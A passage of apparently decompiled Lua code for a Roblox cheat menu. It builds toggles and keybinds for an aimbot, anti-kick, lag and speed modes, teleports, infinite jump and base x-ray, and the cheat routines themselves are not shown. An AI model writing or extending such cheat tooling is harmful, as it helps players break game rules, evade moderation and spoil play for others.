									textButton3.Position = UDim2.new((i - 1) * 0.5, 0, 0, 0)
									textButton3.BackgroundTransparency = 1
									textButton3.Text = ""
									textButton3.AutoButtonColor = false
									textButton3.ZIndex = 5

									textButton3.MouseButton1Click:Connect(function()
										n32 = i
										n33 = 0
										n34 = 0

										for i2, v98 in ipairs(tbl20) do
											v98.TextTransparency = i2 == i and 0 or 0.5
										end

										TweenService:Create(
											frame4,
											TweenInfo.new(0.18, Enum.EasingStyle.Quad),
											{ Position = UDim2.new((i - 1) * 0.5, 4, 0, 4) }
										):Play()
										saveConfig()
									end)
								end

								for i, v97 in ipairs(tbl20) do
									v97.TextTransparency = i == n32 and 0 or 0.5
								end

								local tween_2 = nil

								local function fn43(arg)
									flag18 = arg == true

									if tween_2 then
										tween_2:Cancel()
									end

									if flag18 then
										frame3.Visible = true
										TextButton.Text = "▲"
										tween_2 = TweenService:Create(
											frame3,
											TweenInfo.new(0.24, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
											{ Size = UDim2.new(1, -4, 0, 40) }
										)
									else
										TextButton.Text = "▼"
										tween_2 = TweenService:Create(
											frame3,
											TweenInfo.new(0.2, Enum.EasingStyle.Quint, Enum.EasingDirection.In),
											{ Size = UDim2.new(1, -4, 0, 0) }
										)

										tween_2.Completed:Connect(function()
											if not flag18 then
												frame3.Visible = false
											end
										end)
									end

									tween_2:Play()
								end

								TextButton.MouseButton1Click:Connect(function()
									fn43(not flag18)
								end)

								local v97, v98 = addToggleRow(
									combat,
									"Auto Swing",
									autoSwingEnabled,
									2,
									nil,
									function(arg)
										autoSwingEnabled = arg
										saveConfig()

										if arg and autoBatEnabled then
											startAutoSwingLoop()
										else
											stopAutoSwingLoop()
										end
									end
								)

								autoSwingSetVisual = v98
								addSectLbl(combat, "COUNTER FEATURES", 3)

								addToggleRow(combat, "Bat Counter", batCounterEnabled, 3.1, nil, function(arg)
									batCounterEnabled = arg

									if arg then
										startBatCounter()
									else
										stopBatCounter()
									end

									saveConfig()
								end)

								addToggleRow(combat, "Med Counter", medusaCounterEnabled, 3.35, nil, function(arg)
									medusaCounterEnabled = arg

									if arg then
										startMedusaCounter()
									else
										stopMedusaCounter()
									end

									saveConfig()
								end)

								addSectLbl(combat, "SAFETY FEATURES", 5.25)

								local v99, v100 = addToggleRow(
									combat,
									"Anti Ragdoll",
									antiRagdollEnabled,
									5.4,
									nil,
									function(arg)
										antiRagdollEnabled = arg

										if arg then
											startAntiRagdoll()
										else
											stopAntiRagdoll()
										end

										saveConfig()
									end
								)

								antiRagdollSetVisual = v100

								local v101, v102 = addToggleRow(
									combat,
									"Anti Die",
									antiDieEnabled,
									5.5,
									nil,
									function(arg)
										antiDieEnabled = arg

										if arg then
											startAntiDie()
										else
											stopAntiDie()
										end

										saveConfig()
									end
								)

								antiDieSetVisual = v102

								addToggleRow(combat, "Anti Void", antiVoidEnabled, 5.55, nil, function(arg)
									antiVoidEnabled = arg == true

									if _G.NineDuelsAntiVoid then
										_G.NineDuelsAntiVoid.setEnabled(antiVoidEnabled)
									end

									svAntiVoid(antiVoidEnabled)
									saveConfig()
								end)

								local v103, v104 = addToggleRow(
									combat,
									"Anti Kick",
									antiKickEnabled,
									5.6,
									nil,
									function(arg)
										antiKickEnabled = arg

										if arg then
											startAntiKick()
										else
											stopAntiKick()
										end

										saveConfig()
									end
								)

								antiKickSetVisual = v104

								local v105, v106 = addToggleRow(
									combat,
									"Safe Mode",
									safeModeEnabled,
									5.7,
									nil,
									function(arg)
										safeModeEnabled = arg

										if arg then
											startSafeMode()
										else
											stopSafeMode()
										end

										saveConfig()
									end
								)

								safeModeSetVisual = v106
								addSectLbl(combat, "INSTA RESET FEATURES", 50)

								addActionRow(combat, "Insta Reset", nil, function()
									cursedInstaReset()
								end, 7)

								local frame5 = Instance.new("Frame", combat)
								frame5.Size = UDim2.new(1, 0, 0, 44)
								frame5.BackgroundColor3 = C.row
								frame5.BackgroundTransparency = 0.03
								frame5.BorderSizePixel = 0
								frame5.LayoutOrder = 7.5
								kuruCard(frame5)
								local instance3 = Instance.new("TextLabel", frame5)
								instance3.Size = UDim2.new(1, -70, 1, 0)
								instance3.Position = UDim2.new(0, 13, 0, 0)
								instance3.BackgroundTransparency = 1
								instance3.Text = "Instant Reset Method"
								instance3.TextColor3 = C.text
								instance3.TextSize = 12
								instance3.Font = Enum.Font.GothamMedium
								instance3.TextXAlignment = Enum.TextXAlignment.Left
								local textButton3 = Instance.new("TextButton", frame5)
								textButton3.Size = UDim2.new(0, 40, 0, 30)
								textButton3.Position = UDim2.new(1, -46, 0.5, -15)
								textButton3.BackgroundColor3 = C.bgDark
								textButton3.BackgroundTransparency = 0.08
								textButton3.BorderSizePixel = 0
								textButton3.Text = "▼"
								textButton3.TextColor3 = C.textDim
								textButton3.TextSize = 12
								textButton3.Font = Enum.Font.GothamBold
								textButton3.AutoButtonColor = false
								guiCorner(textButton3, 8)
								local v107 = 0.8
								guiStroke(textButton3, C.divider, 1).Transparency = v107
								local frame6 = Instance.new("Frame", combat)
								frame6.Size = UDim2.new(1, -4, 0, 0)
								frame6.Position = UDim2.new(0, 2, 0, 0)
								frame6.BackgroundColor3 = C.input
								frame6.BackgroundTransparency = 0.22
								frame6.BorderSizePixel = 0
								frame6.LayoutOrder = 7.5
								frame6.Visible = false
								frame6.ClipsDescendants = true
								kuruCard(frame6)
								local instance4 = Instance.new("Frame", frame6)
								instance4.Size = UDim2.new(0.5, -4, 1, -8)
								instance4.Position = UDim2.new(instantResetVersion == 2 and 0.5 or 0, 4, 0, 4)
								instance4.BackgroundColor3 = C.blue
								instance4.BorderSizePixel = 0
								guiCorner(instance4, 13)
								guiStroke(instance4, Color3.fromRGB(245, 245, 255), 1.4).Transparency = 0.08
								local textLabel = Instance.new("TextLabel", frame6)
								textLabel.Size = UDim2.new(0.5, 0, 1, 0)
								textLabel.BackgroundTransparency = 1
								textLabel.Text = "V1"
								textLabel.TextColor3 = C.text
								textLabel.TextSize = 12
								textLabel.Font = Enum.Font.GothamBold
								textLabel.TextXAlignment = Enum.TextXAlignment.Center
								textLabel.ZIndex = 3
								local clone = textLabel:Clone()
								clone.Parent = frame6
								clone.Position = UDim2.new(0.5, 0, 0, 0)
								clone.Text = "V2"
								local textButton4 = Instance.new("TextButton", frame6)
								textButton4.Size = UDim2.new(0.5, 0, 1, 0)
								textButton4.BackgroundTransparency = 1
								textButton4.Text = ""
								textButton4.AutoButtonColor = false
								textButton4.ZIndex = 5
								local clone2 = textButton4:Clone()
								clone2.Parent = frame6
								clone2.Position = UDim2.new(0.5, 0, 0, 0)

								local function fn44()
									local flag19 = instantResetVersion == 2
									TweenService:Create(
										instance4,
										TweenInfo.new(0.18, Enum.EasingStyle.Quad),
										{ Position = flag19 and UDim2.new(0.5, 0, 0, 4) or UDim2.new(0, 4, 0, 4) }
									):Play()
									textLabel.TextTransparency = flag19 and 0.5 or 0
									clone.TextTransparency = flag19 and 0 or 0.5
								end

								local flag19 = false
								local tween_3 = nil

								local function fn45(arg)
									flag19 = arg == true

									if tween_3 then
										tween_3:Cancel()
									end

									if flag19 then
										frame6.Visible = true
										textButton3.Text = "▲"
										tween_3 = TweenService:Create(
											frame6,
											TweenInfo.new(0.24, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
											{ Size = UDim2.new(1, -4, 0, 42) }
										)
										tween_3:Play()
									else
										textButton3.Text = "▼"
										tween_3 = TweenService:Create(
											frame6,
											TweenInfo.new(0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.In),
											{ Size = UDim2.new(1, -4, 0, 0) }
										)

										tween_3.Completed:Connect(function()
											if not flag19 then
												frame6.Visible = false
											end
										end)

										tween_3:Play()
									end
								end

								textButton3.MouseButton1Click:Connect(function()
									fn45(not flag19)
								end)

								textButton4.MouseButton1Click:Connect(function()
									instantResetVersion = 1
									fn44()
									saveConfig()
								end)

								clone2.MouseButton1Click:Connect(function()
									instantResetVersion = 2
									fn44()
									saveConfig()
								end)

								fn44()
								addSectLbl(combat, "ACTION FEATURES", 9)
								local frame7 = Instance.new("Frame", combat)
								frame7.Name = "DropMethodRow"
								frame7.Size = UDim2.new(1, 0, 0, 44)
								frame7.BackgroundColor3 = C.row
								frame7.BackgroundTransparency = 0.03
								frame7.BorderSizePixel = 0
								frame7.LayoutOrder = 9.5
								kuruCard(frame7)
								local instance5 = Instance.new("TextLabel", frame7)
								instance5.Size = UDim2.new(1, -70, 1, 0)
								instance5.Position = UDim2.new(0, 13, 0, 0)
								instance5.BackgroundTransparency = 1
								instance5.Text = "Drop Method"
								instance5.TextColor3 = C.text
								instance5.TextSize = 12
								instance5.Font = Enum.Font.GothamMedium
								instance5.TextXAlignment = Enum.TextXAlignment.Left
								local textButton5 = Instance.new("TextButton", frame7)
								textButton5.Size = UDim2.new(0, 36, 0, 30)
								textButton5.Position = UDim2.new(1, -46, 0.5, -15)
								textButton5.BackgroundColor3 = C.bgDark
								textButton5.BackgroundTransparency = 0.08
								textButton5.BorderSizePixel = 0
								textButton5.Text = "▼"
								textButton5.TextColor3 = C.textDim
								textButton5.TextSize = 12
								textButton5.Font = Enum.Font.GothamBold
								textButton5.AutoButtonColor = false
								guiCorner(textButton5, 8)
								guiStroke(textButton5, C.divider, 1).Transparency = 0.65
								local frame8 = Instance.new("Frame", combat)
								frame8.Name = "DropMethodOptions"
								frame8.Size = UDim2.new(1, -4, 0, 0)
								frame8.Position = UDim2.new(0, 2, 0, 0)
								frame8.BackgroundColor3 = C.input
								frame8.BackgroundTransparency = 0.22
								frame8.BorderSizePixel = 0
								frame8.LayoutOrder = 9.6
								frame8.Visible = false
								frame8.ClipsDescendants = true
								kuruCard(frame8)
								local frame9 = Instance.new("Frame", frame8)
								frame9.Size = UDim2.new(0.5, -4, 1, -8)
								frame9.Position = UDim2.new(selectedDropMode == "Stand Still" and 0.5 or 0, 4, 0, 4)
								frame9.BackgroundColor3 = C.blue
								frame9.BorderSizePixel = 0
								guiCorner(frame9, 13)
								guiStroke(frame9, Color3.fromRGB(245, 245, 255), 1.4).Transparency = 0.08
								local textLabel2 = Instance.new("TextLabel", frame8)
								textLabel2.Size = UDim2.new(0.5, 0, 1, 0)
								textLabel2.BackgroundTransparency = 1
								textLabel2.Text = "JUMP"
								textLabel2.TextColor3 = C.text
								textLabel2.TextSize = 12
								textLabel2.Font = Enum.Font.GothamBold
								textLabel2.TextXAlignment = Enum.TextXAlignment.Center
								textLabel2.ZIndex = 3
								local clone3 = textLabel2:Clone()
								clone3.Parent = frame8
								clone3.Position = UDim2.new(0.5, 0, 0, 0)
								clone3.Text = "STILL"
								local textButton6 = Instance.new("TextButton", frame8)
								textButton6.Size = UDim2.new(0.5, 0, 1, 0)
								textButton6.BackgroundTransparency = 1
								textButton6.Text = ""
								textButton6.AutoButtonColor = false
								textButton6.ZIndex = 5
								local clone4 = textButton6:Clone()
								clone4.Parent = frame8
								clone4.Position = UDim2.new(0.5, 0, 0, 0)
								local flag20 = false
								local tween_4 = nil

								local function fn46()
									local flag21 = selectedDropMode == "Stand Still"
									TweenService:Create(
										frame9,
										TweenInfo.new(0.18, Enum.EasingStyle.Quad),
										{ Position = flag21 and UDim2.new(0.5, 0, 0, 4) or UDim2.new(0, 4, 0, 4) }
									):Play()
									textLabel2.TextTransparency = flag21 and 0.5 or 0
									clone3.TextTransparency = flag21 and 0 or 0.5
								end

								local function fn47(arg)
									selectedDropMode = arg == "Stand Still" and "Stand Still" or "Walk"
									dropBrainrotMode = selectedDropMode
									fn46()
									saveConfig()
								end

								local function fn48(arg)
									flag20 = arg == true

									if tween_4 then
										tween_4:Cancel()
									end

									if flag20 then
										frame8.Visible = true
										textButton5.Text = "▲"
										tween_4 = TweenService:Create(
											frame8,
											TweenInfo.new(0.24, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
											{ Size = UDim2.new(1, -4, 0, 42) }
										)
										tween_4:Play()
									else
										textButton5.Text = "▼"
										tween_4 = TweenService:Create(
											frame8,
											TweenInfo.new(0.2, Enum.EasingStyle.Quint, Enum.EasingDirection.In),
											{ Size = UDim2.new(1, -4, 0, 0) }
										)

										tween_4.Completed:Connect(function()
											if not flag20 then
												frame8.Visible = false
											end
										end)

										tween_4:Play()
									end
								end

								textButton5.MouseButton1Click:Connect(function()
									fn48(not flag20)
								end)

								textButton6.MouseButton1Click:Connect(function()
									fn47("Walk")
								end)

								clone4.MouseButton1Click:Connect(function()
									fn47("Stand Still")
								end)

								fn46()

								addActionRow(combat, "Drop Brainrot", nil, function()
									runDrop()
								end, 10)

								addActionRow(combat, "TP Down", nil, function()
									runTPFloor()
								end, 12)
							end

							fn39()

							local function fn40()
								local keybinds = CategoryRefs.contents.Keybinds
								addSectLbl(keybinds, "MENU BINDS", 101)
								addKeybindRow(keybinds, "Hide GUI Keybind", "guiHide", 102)
								addSectLbl(keybinds, "SPEED & LAGGER BINDS", 103)
								addKeybindRow(keybinds, "Carry Speed Toggle", "speed", 104)
								addKeybindRow(keybinds, "Lagger Mode Toggle", "laggerToggle", 105)
								addKeybindRow(keybinds, "Lagger Carry Toggle", "laggerCarryToggle", 106)
								addSectLbl(keybinds, "COMBAT BINDS", 107)
								addKeybindRow(keybinds, "Bat Aimbot Toggle", "circle", 108)
								addKeybindRow(keybinds, "Bat TP", "antiBatBypass", 109)
								addKeybindRow(keybinds, "Drop Brainrot", "dropBrainrot", 110)
								addKeybindRow(keybinds, "Insta Reset", "instaReset", 111)
								addSectLbl(keybinds, "MOVEMENT BINDS", 112)
								addKeybindRow(keybinds, "Auto Left Toggle", "autoLeft", 113)
								addKeybindRow(keybinds, "Auto Right Toggle", "autoRight", 114)
								addKeybindRow(keybinds, "TP Down", "tpDown", 115)
								addResetKeybindsRow(keybinds, 116)
							end

							fn40()

							local function fn41()
								local movement = CategoryRefs.contents.Movement
								addSectLbl(movement, "AUTO SPEED", 0)

								addToggleRow(
									movement,
									"Auto Switch Speed",
									autoSwitchSpeedEnabled,
									1,
									nil,
									function(autoSwitchSpeedEnabled_)
										autoSwitchSpeedEnabled = autoSwitchSpeedEnabled_

										if State then
											State.autoSwitchSpeedEnabled = autoSwitchSpeedEnabled_
										end

										saveConfig()
									end
								)

								addToggleRow(
									movement,
									"Auto Switch Lagger Carry",
									autoSwitchLaggerCarryEnabled,
									2,
									nil,
									function(autoSwitchLaggerCarryEnabled_)
										autoSwitchLaggerCarryEnabled = autoSwitchLaggerCarryEnabled_

										if State then
											State.autoSwitchLaggerCarryEnabled = autoSwitchLaggerCarryEnabled_
										end

										saveConfig()
									end
								)

								addSectLbl(movement, "SPEED CONFIGURATION", 3)

								addInputRow(movement, "Normal Speed", NS, 4, function(normalSpeed)
									NS = normalSpeed
									State.normalSpeed = normalSpeed
									saveConfig()
								end)

								addInputRow(movement, "Carry Speed", CS, 5, function(carrySpeed)
									CS = carrySpeed
									State.carrySpeed = carrySpeed
									saveConfig()
								end)

								addSectLbl(movement, "LAGGER MODE", 6)

								addInputRow(movement, "Lagger Normal", LAGGER_SPEED, 7, function(laggerSpeed)
									LAGGER_SPEED = laggerSpeed
									State.laggerSpeed = laggerSpeed
									saveConfig()
								end)

								addInputRow(movement, "Lagger Carry", LAGGER_CARRY_SPEED, 8, function(laggerCarrySpeed)
									LAGGER_CARRY_SPEED = laggerCarrySpeed
									State.laggerCarrySpeed = laggerCarrySpeed
									saveConfig()
								end)

								addSectLbl(movement, "SPEED MODES", 9)

								local v86, v87 = addToggleRow(
									movement,
									"Carry Mode",
									carrySpeedActive,
									10,
									nil,
									function(arg)
										carrySpeedActive = arg

										if mobBtnRefs.carrySpeed then
											mobBtnRefs.carrySpeed(carrySpeedActive)
										end

										if carryModeSetVisual then
											carryModeSetVisual(carrySpeedActive)
										end

										if toggleRefs and toggleRefs.carryMode then
											toggleRefs.carryMode(carrySpeedActive)
										end

										if refreshSpeedModeLabel then
											refreshSpeedModeLabel()
										end

										saveConfig()
									end
								)

								carryModeSetVisual = v87

								local v88, v89 = addToggleRow(
									movement,
									"Lagger Mode",
									laggerModeEnabled,
									11,
									nil,
									function(arg)
										setLaggerModeEnabled(arg)
										saveConfig()
									end
								)

								laggerModeSetVisual = v89

								local v90, v91 = addToggleRow(
									movement,
									"Lagger Carry Mode",
									laggerCarryToggled,
									12,
									nil,
									function(arg)
										if arg ~= laggerCarryToggled then
											toggleLaggerCarryMode()
										end

										if mobBtnRefs.laggerCarry then
											mobBtnRefs.laggerCarry(laggerCarryToggled)
										end

										if laggerModeSetVisual then
											laggerModeSetVisual(laggerModeEnabled)
										end

										if carryModeSetVisual then
											carryModeSetVisual(carrySpeedActive)
										end

										saveConfig()
									end
								)

								laggerCarryModeSetVisual = v91
								addSectLbl(movement, "AUTO WALK FEATURES", 13)

								local v92, v93 = addToggleRow(
									movement,
									"Auto Left",
									autoLeftEnabled,
									14,
									nil,
									function(arg)
										if arg then
											if autoRightEnabled then
												autoRightEnabled = false
												stopAutoRight()

												if autoRightSetVisual then
													autoRightSetVisual(false)
												end
											end

											if autoBatEnabled then
												stopBatAimbot()

												if autoBatSetVisual then
													autoBatSetVisual(false)
												end
											end

											autoLeftEnabled = true
											startAutoLeft()

											if mobBtnRefs.autoLeft then
												mobBtnRefs.autoLeft(true)
											end
										else
											autoLeftEnabled = false
											stopAutoLeft()

											if mobBtnRefs.autoLeft then
												mobBtnRefs.autoLeft(false)
											end
										end

										saveConfig()
									end
								)

								autoLeftSetVisual = v93

								local v94, v95 = addToggleRow(
									movement,
									"Auto Right",
									autoRightEnabled,
									15,
									nil,
									function(arg)
										if arg then
											if autoLeftEnabled then
												autoLeftEnabled = false
												stopAutoLeft()

												if autoLeftSetVisual then
													autoLeftSetVisual(false)
												end
											end

											if autoBatEnabled then
												stopBatAimbot()

												if autoBatSetVisual then
													autoBatSetVisual(false)
												end
											end

											autoRightEnabled = true
											startAutoRight()

											if mobBtnRefs.autoRight then
												mobBtnRefs.autoRight(true)
											end
										else
											autoRightEnabled = false
											stopAutoRight()

											if mobBtnRefs.autoRight then
												mobBtnRefs.autoRight(false)
											end
										end

										saveConfig()
									end
								)

								autoRightSetVisual = v95
								addSectLbl(movement, "TP SETTINGS", 16)

								local v96, v97 = addToggleRow(movement, "Auto TP", autoTPEnabled, 17, nil, function(arg)
									autoTPEnabled = arg

									if arg then
										startAutoTP()
									else
										stopAutoTP()
									end

									saveConfig()
								end)

								setAutoTPVisual = v97

								addInputRow(movement, "TP Height", autoTPHeight, 18.8, function(arg)
									if arg >= 0 and arg <= 500 then
										autoTPHeight = arg
									end

									saveConfig()
								end)

								addToggleRow(
									movement,
									"Mirror TP Down",
									_G.NineDuelsMirrorTPDownEnabled,
									15,
									nil,
									function(arg)
										if _G.NineDuelsSetMirrorTPDown then
											_G.NineDuelsSetMirrorTPDown(arg)
										end

										saveConfig()
									end
								)

								if _G.NineDuelsMirrorTPDownEnabled and _G.NineDuelsSetMirrorTPDown then
									_G.NineDuelsSetMirrorTPDown(true)
								end

								addSectLbl(movement, "CHARACTER OPTIONS", 19)

								local v98, v99 = addToggleRow(
									movement,
									"Infinite Jump",
									infJumpEnabled,
									20,
									nil,
									function(arg)
										infJumpEnabled = arg
										applyInfJumpMode()
										saveConfig()
									end
								)

								setInfJumpVisual = v99
								local frame = Instance.new("Frame", movement)
								frame.Size = UDim2.new(1, 0, 0, 42)
								frame.BackgroundColor3 = C.row
								frame.BackgroundTransparency = 0.5
								frame.BorderSizePixel = 0
								frame.LayoutOrder = 21
								guiCorner(frame, 10)
								guiStroke(frame, C.divider, 1)
								local instance = Instance.new("TextLabel", frame)
								instance.Size = UDim2.new(0.5, 0, 0, 16)
								instance.Position = UDim2.new(0, 12, 0, 13)
								instance.BackgroundTransparency = 1
								instance.Text = "Mode"
								instance.TextColor3 = C.text
								instance.TextSize = 11
								instance.Font = Enum.Font.GothamBold
								instance.TextXAlignment = Enum.TextXAlignment.Left
								local instance2 = Instance.new("Frame", frame)
								instance2.Size = UDim2.new(0, 120, 0, 24)
								instance2.Position = UDim2.new(1, -142, 0.5, -12)
								instance2.BackgroundColor3 = Color3.fromRGB(30, 32, 36)
								instance2.BorderSizePixel = 0
								guiCorner(instance2, 6)
								guiStroke(instance2, C.divider, 1)
								local textButton = Instance.new("TextButton", instance2)
								textButton.Size = UDim2.new(0.5, 0, 1, 0)
								textButton.Position = UDim2.new(0, 0, 0, 0)
								textButton.BackgroundTransparency = 1
								textButton.Text = "Hold"
								textButton.TextColor3 = C.text
								textButton.Font = Enum.Font.GothamBold
								textButton.TextSize = 10
								textButton.BorderSizePixel = 0
								local textButton2 = Instance.new("TextButton", instance2)
								textButton2.Size = UDim2.new(0.5, 0, 1, 0)
								textButton2.Position = UDim2.new(0.5, 0, 0, 0)
								textButton2.BackgroundTransparency = 1
								textButton2.Text = "Classic"
								textButton2.TextColor3 = C.text
								textButton2.Font = Enum.Font.GothamBold
								textButton2.TextSize = 10
								textButton2.BorderSizePixel = 0
								local frame2 = Instance.new("Frame", instance2)
								frame2.Size = UDim2.new(0.5, -2, 1, -2)
								frame2.Position = UDim2.new(0, 1, 0, 1)
								frame2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
								frame2.BorderSizePixel = 0
								guiCorner(frame2, 5)
								guiStroke(frame2, Color3.fromRGB(205, 200, 210), 1)

								local function fn42()
									local flag18 = fn33() == "hold"
									tw(
										frame2,
										{ Position = flag18 and UDim2.new(0, 1, 0, 1) or UDim2.new(0.5, 1, 0, 1) }
									)
									textButton.TextColor3 = flag18 and Color3.fromRGB(20, 20, 28) or C.text
									textButton2.TextColor3 = flag18 and C.text or Color3.fromRGB(20, 20, 28)
								end

								fn42()

								textButton.MouseButton1Click:Connect(function()
									infJumpMode = "hold"
									fn42()
									applyInfJumpMode()
									saveConfig()
								end)

								textButton2.MouseButton1Click:Connect(function()
									infJumpMode = "classic"
									fn42()
									applyInfJumpMode()
									saveConfig()
								end)

								local textButton3 = Instance.new("TextButton", frame)
								textButton3.Size = UDim2.new(1, 0, 1, 0)
								textButton3.BackgroundTransparency = 1
								textButton3.Text = ""
								textButton3.ZIndex = 0

								textButton3.MouseEnter:Connect(function()
									tw(frame, { BackgroundTransparency = 0.3 })
								end)

								textButton3.MouseLeave:Connect(function()
									tw(frame, { BackgroundTransparency = 0.5 })
								end)
							end

							fn41()

							local function fn42()
								local visuals = CategoryRefs.contents.Visuals
								addSectLbl(visuals, "AVATAR VISUALS", -1)

								addToggleRow(visuals, "Headless", headlessEnabled, -0.8, nil, function(arg)
									headlessEnabled = arg
									applyAvatarVisuals(LP.Character)
									saveConfig()
								end)

								addToggleRow(visuals, "Korblox", korbloxEnabled, -1, nil, function(arg)
									korbloxEnabled = arg
									applyAvatarVisuals(LP.Character)
									saveConfig()
								end)

								addSectLbl(visuals, "PERFORMANCE", 1)

								local v86 = addToggleRow(
									visuals,
									"Performance Mode",
									antiLagEnabled,
									2,
									nil,
									function(arg)
										if arg then
											enableAntiLag()
										else
											disableAntiLag()
										end

										saveConfig()
									end
								)

								v86.Size = UDim2.new(1, 0, 0, 46)
								local frame = Instance.new("Frame", v86)
								frame.Size = UDim2.new(0, 170, 0, 14)
								frame.Position = UDim2.new(0, 12, 0, 25)
								frame.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
								frame.BackgroundTransparency = 0.35
								frame.BorderSizePixel = 0
								guiCorner(frame, 5)
								local instance = Instance.new("TextLabel", frame)
								instance.Size = UDim2.new(1, 0, 1, 0)
								instance.BackgroundTransparency = 1
								instance.Text = "Recommended for low end PCs"
								instance.TextColor3 = Color3.fromRGB(210, 210, 210)
								instance.TextSize = 8
								instance.Font = Enum.Font.GothamBold

								addToggleRow(visuals, "Stretch Resolution", stretchRezEnabled, 3, nil, function(arg)
									if arg then
										enableStretchRez()
									else
										disableStretchRez()
									end

									saveConfig()
								end)

								addSectLbl(visuals, "VISUALS", 4)

								local v87, v88 = addToggleRow(
									visuals,
									"Dark Mode",
									State.darkModeEnabled or false,
									4.1,
									nil,
									function(darkModeEnabled)
										State.darkModeEnabled = darkModeEnabled

										if darkModeEnabled then
											currentSkyTheme = "Off"
											CandyApplyCustomSky("Off")
											local phantomDarkSky = Lighting:FindFirstChild("phantomDarkSky")
												or Instance.new("Sky")
											phantomDarkSky.Name = "phantomDarkSky"
											phantomDarkSky.SkyboxBk = "rbxassetid://159454299"
											phantomDarkSky.SkyboxDn = "rbxassetid://159454296"
											phantomDarkSky.SkyboxFt = "rbxassetid://159454293"
											phantomDarkSky.SkyboxLf = "rbxassetid://159454286"
											phantomDarkSky.SkyboxRt = "rbxassetid://159454289"
											phantomDarkSky.SkyboxUp = "rbxassetid://159454291"
											phantomDarkSky.Parent = Lighting
											Lighting.Brightness = 0
											Lighting.ClockTime = 0
											Lighting.ExposureCompensation = -2
											Lighting.OutdoorAmbient = Color3.fromRGB(0, 0, 0)
										else
											local phantomDarkSky = Lighting:FindFirstChild("phantomDarkSky")

											if phantomDarkSky then
												phantomDarkSky:Destroy()
											end

											Lighting.Brightness = defLightBrightness or 2
											Lighting.ClockTime = defLightClock or 14
											Lighting.ExposureCompensation = 0
											Lighting.OutdoorAmbient = defLightAmbient or Color3.fromRGB(127, 127, 127)
										end

										saveConfig()
									end
								)

								addToggleRow(visuals, "Saturation", saturationEnabled, 4.2, nil, function(arg)
									applySaturation(arg)
									saveConfig()
								end)

								local instance2 = Instance.new("Frame", visuals)
								instance2.Name = "BaseXRayExpandable"
								instance2.Size = UDim2.new(1, 0, 0, 46)
								instance2.BackgroundTransparency = 1
								instance2.BorderSizePixel = 0
								instance2.LayoutOrder = 4.3
								instance2.ClipsDescendants = true
								local frame2 = Instance.new("Frame", instance2)
								frame2.Size = UDim2.new(1, 0, 0, 46)
								frame2.BackgroundColor3 = C.row
								frame2.BackgroundTransparency = 0.03
								frame2.BorderSizePixel = 0
								kuruCard(frame2)
								local textLabel = Instance.new("TextLabel", frame2)
								textLabel.Size = UDim2.new(1, -160, 1, 0)
								textLabel.Position = UDim2.fromOffset(14, 0)
								textLabel.BackgroundTransparency = 1
								textLabel.Text = "Base XRay"
								textLabel.TextColor3 = C.text
								textLabel.TextSize = 14
								textLabel.Font = Enum.Font.GothamMedium
								textLabel.TextXAlignment = Enum.TextXAlignment.Left
								local frame3 = Instance.new("Frame", frame2)
								frame3.Size = UDim2.fromOffset(44, 22)
								frame3.Position = UDim2.new(1, -54, 0.5, -11)
								frame3.BackgroundColor3 = _G.NineDuelsBaseXRayEnabled and C.blue or C.blueDim
								frame3.BorderSizePixel = 0
								guiCorner(frame3, 11)
								local frame4 = Instance.new("Frame", frame3)
								frame4.Size = UDim2.fromOffset(16, 16)
								frame4.Position = _G.NineDuelsBaseXRayEnabled and UDim2.new(1, -19, 0.5, -8)
									or UDim2.new(0, 3, 0.5, -8)
								frame4.BackgroundColor3 = _G.NineDuelsBaseXRayEnabled and C.bgDark or C.textDim
								frame4.BorderSizePixel = 0
								guiCorner(frame4, 8)
								local nineDuelsBaseXRayEnabled = _G.NineDuelsBaseXRayEnabled

								local function fn43(arg)
									nineDuelsBaseXRayEnabled = arg
									tw(frame3, { BackgroundColor3 = arg and C.blue or C.blueDim })

									tw(frame4, {
										Position = arg and UDim2.new(1, -19, 0.5, -8) or UDim2.new(0, 3, 0.5, -8),
										BackgroundColor3 = arg and C.bgDark or C.textDim,
									})

									return
								end

								local textButton = Instance.new("TextButton", frame2)
								textButton.Size = UDim2.fromOffset(44, 22)
								textButton.Position = frame3.Position
								textButton.BackgroundTransparency = 1
								textButton.Text = ""
								textButton.ZIndex = 5

								textButton.MouseButton1Click:Connect(function()
									nineDuelsBaseXRayEnabled = not nineDuelsBaseXRayEnabled
									fn43(nineDuelsBaseXRayEnabled)

									if _G.NineDuelsSetBaseXRay then
										_G.NineDuelsSetBaseXRay(nineDuelsBaseXRayEnabled)
									end

									saveConfig()
								end)

								local textButton2 = Instance.new("TextButton", frame2)
								textButton2.Size = UDim2.new(0, 40, 0, 30)
								textButton2.Position = UDim2.new(1, -96, 0.5, -44)
								textButton2.BackgroundColor3 = C.bgDark
								textButton2.BackgroundTransparency = 0.08
								textButton2.BorderSizePixel = 0
								textButton2.Text = "▼"
								textButton2.TextColor3 = C.textDim
								textButton2.TextSize = 12
								textButton2.Font = Enum.Font.GothamBold
								textButton2.AutoButtonColor = false
								textButton2.ZIndex = 5
								guiCorner(textButton2, 8)
								guiStroke(textButton2, C.divider, 1).Transparency = 0.65
								local frame5 = Instance.new("Frame", instance2)
								frame5.Size = UDim2.new(1, 0, 0, 58)
								frame5.Position = UDim2.fromOffset(0, 46)
								frame5.BackgroundColor3 = C.row
								frame5.BackgroundTransparency = 0.5
								frame5.BorderSizePixel = 0
								kuruCard(frame5)
								local textLabel2 = Instance.new("TextLabel", frame5)
								textLabel2.Size = UDim2.new(1, -80, 0, 16)
								textLabel2.Position = UDim2.fromOffset(12, 6)
								textLabel2.BackgroundTransparency = 1
								textLabel2.Text = "Transparency"
								textLabel2.TextColor3 = C.textDim
								textLabel2.TextSize = 11
								textLabel2.Font = Enum.Font.GothamBold
								textLabel2.TextXAlignment = Enum.TextXAlignment.Left
								local textLabel3 = Instance.new("TextLabel", frame5)
								textLabel3.Size = UDim2.fromOffset(52, 16)
								textLabel3.Position = UDim2.new(1, -64, 0, 6)
								textLabel3.BackgroundTransparency = 1
								textLabel3.Text = tostring(
									math.floor((_G.NineDuelsBaseXRayTransparency or 0.5) * 100 + 0.5)
								) .. "%"
								textLabel3.TextColor3 = C.textDim
								textLabel3.TextSize = 10
								textLabel3.Font = Enum.Font.GothamBold
								textLabel3.TextXAlignment = Enum.TextXAlignment.Right
								local instance3 = Instance.new("Frame", frame5)
